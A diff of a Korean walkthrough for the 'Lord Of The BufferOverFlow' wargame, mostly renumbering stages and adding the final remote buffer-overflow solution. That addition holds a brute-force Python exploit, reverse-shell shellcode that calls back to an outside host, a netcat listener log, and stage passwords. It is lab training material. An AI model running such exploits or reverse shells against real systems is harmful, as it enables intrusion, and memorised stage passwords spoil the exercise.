@@ -1,6 +1,6 @@
 # Lord Of The BufferOverFlow 공략
 
-옛날에 완전 대충 풀었던 것 같아, 다시 시작해본다. 코찔찔이던 시절에 풀면서 느낀 거랑 어느정도 머리가 커진 뒤 풀면서 느끼는게 좀 다른 거 같다.
+옛날에 완전 대충 풀었던 것 같아, 다시 시작해본다. 코찔찔이던 시절에 풀면서 느낀 거랑 어느정도 머리가 커진 뒤 풀면서 느끼는게 좀 다른 거 같다. 뭔가 문제를 푸는 순서가 굉장히 이상한 걸 본인도 느끼고 있지만, 그래도 이제껏 찜찜했던 걸 해소하고 싶다.
 
 gate / gate 로 접속
 
@@ -116,6 +116,8 @@ hello bof world
 
 
 
+
+
 ## STAGE 2 : gremlin -> cobolt
 
 ```c
@@ -153,6 +155,8 @@ hacking exposed
 
 
 
+
+
 ## STAGE 3 : cobolt -> goblin
 
 ```c
@@ -183,6 +187,8 @@ my-pass
 euid = 503
 hackers proof
 ```
+
+
 
 
 
@@ -243,7 +249,7 @@ cantata
 
 
 
-## STAGE 6 : orc -> wolfman
+## STAGE 5 : orc -> wolfman
 
 ```c
 /*
@@ -301,7 +307,7 @@ love eyuna
 
 
 
-## STAGE 7 : wolfman -> darkelf
+## STAGE 6 : wolfman -> darkelf
 
 ```c
 /*
@@ -439,7 +445,9 @@ argv 확인. 저기 보면, 스택 가장 밑단에(가장 높은 주소) 실행
 
 
 
-## STAGE 8 : darkelf -> orge
+
+
+## STAGE 7 : darkelf -> orge
 
 ```c
 /*
@@ -523,7 +531,7 @@ timewalker
 
 
 
-## STAGE 9 : orge -> troll
+## STAGE 8 : orge -> troll
 
 ```c
 /*
@@ -597,7 +605,7 @@ aspirin
 
 
 
-## STAGE 10 : troll -> vampire
+## STAGE 9 : troll -> vampire
 
 ```c
 /*
@@ -689,7 +697,7 @@ music world
 
 
 
-## STAGE 11 : vampire -> skeleton
+## STAGE 10 : vampire -> skeleton
 
 ```c
 /*
@@ -774,7 +782,7 @@ shellcoder
 
 
 
-## STAGE : skeleton -> golem
+## STAGE 11 : skeleton -> golem
 
 ```c
 /*
@@ -888,7 +896,7 @@ cup of coffee
 
 
 
-## STAGE : golem -> darknight
+## STAGE 12 : golem -> darknight
 
 ```c
 /*
@@ -958,7 +966,7 @@ new attacker
 
 
 
-## darkknight -> bugbear
+## STAGE 13 : darkknight -> bugbear
 
 ```c
 /*
@@ -1031,7 +1039,7 @@ new divide
 
 
 
-## bugbear -> giant
+## STAGE 14 : bugbear -> giant
 
 ```c
 /*
@@ -1123,7 +1131,7 @@ one step closer
 
 
 
-## STAGE : giant -> assassin
+## STAGE 15 : giant -> assassin
 
 ```c
 /*
@@ -1205,7 +1213,7 @@ pushing me away
 
 
 
-## STAGE : assassin -> zombie_assassin
+## STAGE 16 : assassin -> zombie_assassin
 
 ```c
 /*
@@ -1300,7 +1308,7 @@ no place to hide
 
 
 
-## zombie_assassin -> succubus
+## STAGE 17 : zombie_assassin -> succubus
 
 ```c
 /*
@@ -1431,7 +1439,7 @@ here to stay
 
 
 
-## succubus -> nightmare
+## STAGE 18 : succubus -> nightmare
 
 ```c
 /*
@@ -1493,7 +1501,7 @@ beg for me
 
 
 
-## STAGE : nightmare -> xavius
+## STAGE 19 : nightmare -> xavius
 
 ```c
 /*
@@ -1655,7 +1663,7 @@ throw me away
 
 
 
-## STAGE : xavius -> death_knight
+## STAGE 20 : xavius -> death_knight
 
 ```shell
 /*
@@ -1725,19 +1733,112 @@ main()
 }
 ```
 
+remote bof이다. recv를 256만큼 buffer에 저장하기 때문에 bof가 터진다. 
+
+하 슬프게도 내가 만든 reverse shellcode가 이유는 모르겠는데 작동을 안해서 만든 보람을 못 느꼈다. 
+
+결국 쉘 스톰에 올라온거 사용함 http://shell-storm.org/shellcode/files/shellcode-833.php
+
+```python
+#!/usr/bin/python
+import socket
+import struct
+
+target_ret = 0xbfff0000
+
+shellcode1 = "\x90"*100 + "\x6a\x00\x6a\x01\x6a\x02\x31\xdb\x43\x89\xe1\x31\xc0\xb0\x66\xcd\x80\x89\xc6\x68\x7f\x01\x01\x01\x66\x68\x30\x39\x66\x6a\x02\x89\xe1\x43\x43\x6a\x10\x51\x56\x89\xe1\x31\xc0\xb0\x66\xcd\x80\x89\xf3\x31\xc9\xb1\x00\xb0\x3f\xcd\x80\x41\xcd\x80\x41\xcd\x80\x31\xc9\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90"
+
+shellcode2 = "\x90"*100 + \
+        "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"+\
+        "\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x79\xab\x94\x7d\x68"+\
+        "\x02\x00\x30\x39\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"+\
+        "\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"+\
+        "\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+for i in range(0xffff, 0, -1) :
+    r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    r.connect(('192.168.17.134', 6666))
+
+    payload = "A"*44 + struct.pack('<L', target_ret+i) + shellcode2
+
+    print "target_ret = %s" % hex(target_ret+i)
+    print r.recv(60) 
+    r.send(payload)
+    r.close()
+```
 
 
 
+그냥 돌리고 휴대폰 좀 만지다 보면 어느순간 연결된다.
+
+```shell
+target_ret = 0xbffffd56
+Death Knight : Not even death can save you from me!
+
+target_ret = 0xbffffd55
+Death Knight : Not even death can save you from me!
+
+target_ret = 0xbffffd54
+Death Knight : Not even death can save you from me!
+
+target_ret = 0xbffffd53
+Death Knight : Not even death can save you from me!
+...
+```
 
 
 
+대충 0xbffffdf0 부근에서 되는거 같다.
 
+```shell
+ ✘ ch4rli3kop@ch4rli3kop-pc > ~/tmp/revshell > nc -lvp 12345
+Listening on [0.0.0.0] (family 0, port 12345)
+Connection from 121.171.148.125 58682 received!
+id
+uid=0(root) gid=0(root) euid=520(death_knight) egid=520(death_knight)
+my-pass
+euid = 520
+got the life
 
 ```
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
 
-\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
 
+
+접속하면 끝.
+
+```shell
+[death_knight@localhost death_knight]$ cat dropped_item.txt 
+	
+ You're so great! This is a token to the next gate.
+
+                   ,.
+                 ,'  `.
+               ,' _<>_ `.
+             ,'.-'____`-.`.
+           ,'_.-''    ``-._`.
+         ,','      /\      `.`.
+       ,' /.._  O /  \ O  _.,\ `.
+     ,'/ /  \ ``-;.--.:-'' /  \ \`.
+   ,' : :    \  /\`.,'/\  /    : : `.
+  < <>| |   O >(< (  ) >)< O   | |<> >
+   `. : :    /  \/,'`.\/  \    ; ; ,'
+     `.\ \  /_..-:`--';-.._\  / /,'
+       `. \`'   O \  / O   `'/ ,'
+         `.`._     \/     _,','
+           `..``-.____.-'',,'
+             `.`-.____.-','
+               `.  <>  ,'
+                 `.  ,' 
+                   `'
 ```
+
+
+
+하... 미친 마지막 문제 왤케 오래걸린지 모르겠다... ㅠㅠ 내가 만든 쉘코드는 왜 안되는거지... ㅠㅠ 
+
+암튼 드디어 끝냈다. ㅋㅋ 맘 먹으면 며칠만에 하는데 옛날에는 왤케 안했었는지..ㅋㅋㅋ
+
+Lord Of BufferOverFlow 징짜 잘 맨드신거 같다! 재밌었다.
+
 
 
